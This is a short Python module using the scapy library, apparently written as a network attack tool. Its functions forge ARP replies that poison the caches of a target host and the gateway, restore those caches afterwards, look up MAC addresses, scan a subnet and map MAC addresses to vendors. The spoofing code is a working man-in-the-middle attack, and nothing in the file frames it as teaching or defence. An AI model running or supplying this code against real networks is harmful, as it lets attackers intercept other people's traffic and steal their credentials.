import scapy.all as scapy

def spoof (host_ip,host_mac,gateway,gateway_mac):
    packet1 = scapy.ARP(op=2,pdst=host_ip,hwdst=host_mac, psrc=gateway)
    packet2 = scapy.ARP(op=2,pdst=gateway,hwdst=gateway_mac, psrc=host_ip)
    scapy.send(packet1,verbose=False)
    scapy.send(packet2,verbose=False)

def restore(host_ip,host_mac,gateway,gateway_mac):
    packet1 = scapy.ARP(op=2,pdst=host_ip,hwdst=host_mac, psrc=gateway, hwsrc=gateway_mac)
    packet2 = scapy.ARP(op=2,pdst=gateway,hwdst=gateway_mac, psrc=host_ip, hwsrc=host_mac)
    scapy.send(packet1 , verbose=False)
    scapy.send(packet2 , verbose=False)

def get_target_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff ')
    arp_request_broadcast = broadcast/arp_request
    answered_list= scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
    return answered_list[0][1].src

def scan(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered_list= scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
    return answered_list

def get_mac_vendor(mac):
    mac = mac.upper().replace(':','')[0:6]
    with open("mac-vendor.txt","r") as f:
        for line in f :
            if mac in line:
                return line[7:]
    return 'Unknown' 